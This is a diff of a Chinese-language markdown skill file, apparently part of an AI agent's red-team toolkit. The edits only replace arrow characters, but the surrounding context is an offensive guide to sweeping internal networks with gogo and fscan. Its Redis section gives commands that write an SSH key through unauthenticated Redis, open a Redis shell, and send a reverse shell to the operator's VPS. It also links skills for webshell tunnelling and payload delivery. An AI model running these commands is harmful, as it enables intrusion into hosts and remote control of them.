@@ -19,7 +19,7 @@ enabled: true
 | 噪声 | 大（默认 600 线程 + 爆破 + POC） | 可控（`--opsec`、线程/超时自调） |
 | 先用哪个 | 目标明确、要快速找弱口令与洞 | 大网段先铺面、要指纹和 title |
 
-**推荐顺序**：先 `gogo` 铺面拿资产清单 → 再 `fscan` 对确认存活的目标做定向爆破与漏洞。
+**推荐顺序**：先 `gogo` 铺面拿资产清单 -> 再 `fscan` 对确认存活的目标做定向爆破与漏洞。
 
 ## 二进制
 
@@ -166,7 +166,7 @@ ip a; ip route
 ### 3. 拿 Redis 直接要权限
 
 ```bash
-./fscan -h 10.0.0.5 -p 6379 -m redis -rf ~/.ssh/id_rsa.pub     # 写公钥 → ssh 上去
+./fscan -h 10.0.0.5 -p 6379 -m redis -rf ~/.ssh/id_rsa.pub     # 写公钥 -> ssh 上去
 ./fscan -h 10.0.0.5 -p 6379 -rs                                  # Redis Shell
 ./fscan -h 10.0.0.5 -p 6379 -rsh <你的VPS_IP>:9000              # 反弹到 VPS 监听
 ```
@@ -211,6 +211,6 @@ redteam_vuln_add   { engagement, target, name: "Redis 未授权访问", severity
 ## 相关技能
 
 - `gogo-intranet`：先用它铺面
-- `suo5-tunnel`：WebShell → SOCKS5，给 fscan 提供 `-socks5` 入口
+- `suo5-tunnel`：WebShell -> SOCKS5，给 fscan 提供 `-socks5` 入口
 - `vps-reverse-shell`：`-rsh` 的落地端、载荷投递
 - `webshell-toolkit`：拿到 WebShell 后的管理
